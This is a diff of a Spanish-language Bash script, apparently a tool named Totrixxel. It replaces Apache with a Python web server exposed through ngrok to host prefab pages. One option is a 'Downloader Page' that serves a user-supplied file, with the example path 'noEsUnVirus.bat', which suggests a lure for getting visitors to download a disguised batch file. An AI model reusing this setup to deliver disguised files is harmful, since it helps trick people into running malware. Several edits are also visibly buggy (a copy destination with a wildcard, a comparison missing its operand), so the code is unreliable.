@@ -23,15 +23,16 @@ function ctrl_c() {
     
     if [ ${closeV,,} != "n" ]
     then
-        echo -e "$RED[!] Cerrando Apache Server."
-        service apache2 stop
+        echo -e "$RED[!] Cerrando Python Server."
+        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
+        kill $apid
         if [ $(ps aux | grep ngrok | wc -l) -gt ]
         then
             ps aux | grep ngrok | head -n 1 > data ; pid=$(awk '{print $2}' data)
             rm -rf data
             kill $pid
         fi
-        echo -e "$GREEN[+] Apache Server Closed."
+        echo -e "$GREEN[+] Python Server Closed."
         echo -e "[+] Ngrok Server Closed."
         echo -e "[+] Totrixxel Cerrado exitosamente...$NORMAL"
         sleep 1.8
@@ -67,11 +68,11 @@ function init_program() {
         clear
         echo "[*] Ngrok Server is not configured. https://ngrok.com"
     fi
-    if [ $(ps aux | grep www-data | wc -l) -lt 2 ]
+    if [ $(ps aux | grep http | wc -l) -lt 2 ]
     then
-        service apache2 start
+        sudo python -m http.server 80 -d server> /dev/null &
     fi
-    echo -e "[*] Servidor Apache iniciado en $CYAN$ip$GREEN:80$NORMAL"
+    echo -e "[*] Servidor Python iniciado en $CYAN$ip$GREEN:80$NORMAL"
     if [ $(ps aux | grep ngrok | wc -l) -gt 1 ]; then
         echo -e "[*] Servidor Ngrok iniciado en $CYAN$ngrokUrl$GREEN:$ngrokPort$NORMAL"
     fi
@@ -85,61 +86,60 @@ function init_program() {
         then
             echo -e "[*] Info: Ej: /home/$usuario/Descargas/prefabs/"
             echo -e "Ruta completa de la pagina >> "; read pagdir
-            rm -r /var/www/html
-            mkdir /var/www/html
-            cp  $pagdir* /var/www/html
+            rm -r server/*
+            cp  $pagdir* server/*
         elif [ $qpagexist == "n" ]
         then
             echo -e "Selecciona un prefab"
             echo -e "[0] Txx Info    [1] Downloader Page\n"; read qprefabpag
             if [ $qprefabpag == "0" ]
             then
-            	rm -r /var/www/html
-            	mkdir /var/www/html
-            	cp /prefabs/txx/* /var/www/html
+            	rm -r server/*
+            	cp /prefabs/txx/* server/*
             elif [ $qprefabpag == "1" ]
             then
-                rm -r /var/www/html/
-                mkdir /var/www/html/
+                rm -r server/*
                 echo -e "[*] Info: Ej: /home/$usuario/Descargas/prepag/noEsUnVirus.bat"
                 echo -e "Ruta completa de el archivo >> "; read filedir
-                cp $filedir /var/www/html/
-                mv /var/www/html/* /var/www/html/archivo.txt
-                cp /prefabs/dwd_file/* /var/www/html/
+                cp $filedir server/
+                mv server/* server/archivo.txt
+                cp /prefabs/dwd_file/* server/
             elif [ $qprefabpag == "3" ]
             then
-                rm -r /var/www/html
-                mkdir /var/www/html
-                cp /prefabs/tw/* /var/www/html
+                rm -r server/*
+                cp /prefabs/tw/* server/*
             else
                 echo -e "[-] Err: Opcion no existe."
             fi
         else
             echo -e "[-] Err: Opcion no existe."
         fi
-        service apache2 restart
+        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
+        kill $apid
+        sudo python -m http.server 80 -d server> /dev/null &
         echo -e "[*] Totrixxel está ejecutando la página en vivo..."
         echo -e "Presiona 'Enter' para dejar de ejecutar el servidor..."; read
         echo -e "[*] Totrixxel está cerrando el servidor..."
-        service apache2 stop
-        echo -e "[*] El servidor Apache se ha cerrado correctamente."
+        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
+        kill $apid
+        echo -e "[*] El servidor Python se ha cerrado correctamente."
         kill $pid
         echo -e "[*] El servidor Ngrok se ha cerrado correctamente."
     elif [ $qaction == "2" ]
     then
         echo -e "Creador del repo"; read repouser
         echo -e "\nNombre del repo";read reponame
-        rm -r /var/www/html
-        mkdir /var/www/html
-        cd /var/www/html
+        rm -r server/*
+        cd server/
     	git clone https://www.github.com/$repouser/$reponame
     elif [ $qaction == "3" ]
     then
         echo -e "[*] Totrixxel está ejecutando la página en vivo..."
         echo -e "Presiona 'Enter' para dejar de ejecutar el servidor..."; read
         echo -e "[*] Totrixxel está cerrando el servidor..."
-        service apache2 stop
-        echo -e "[*] El servidor Apache se ha cerrado correctamente."
+        apid=$(ps aux | grep http | head -n 1 | awk '{print $2}')
+        kill $apid
+        echo -e "[*] El servidor Python se ha cerrado correctamente."
         kill $pid
         echo -e "[*] El servidor Ngrok se ha cerrado correctamente."
     fi
